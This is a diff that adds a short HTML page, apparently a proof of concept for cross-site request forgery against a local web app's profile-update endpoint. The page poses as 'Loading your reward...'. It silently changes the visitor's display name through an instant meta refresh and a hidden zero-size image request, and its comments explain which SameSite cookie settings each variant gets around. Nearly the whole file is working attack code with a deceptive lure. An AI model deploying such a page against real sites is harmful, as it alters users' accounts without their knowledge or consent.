@@ -1,0 +1,8 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Loading...</title>
+<!-- Top-level navigation: works with SameSite=Lax defaults, no click required -->
+<meta http-equiv="refresh" content="0; url=http://localhost:5000/profile/update?display_name=HACKED_BY_CSRF">
+</head><body>Loading your reward...
+<!-- Classic hidden-image variant (works when cookies are sent cross-site, e.g. older
+     browsers / SameSite=None); modern Lax browsers block cookies on subresource requests: -->
+<img src="http://localhost:5000/profile/update?display_name=HACKED_BY_IMG" width="0" height="0">
+</body></html>
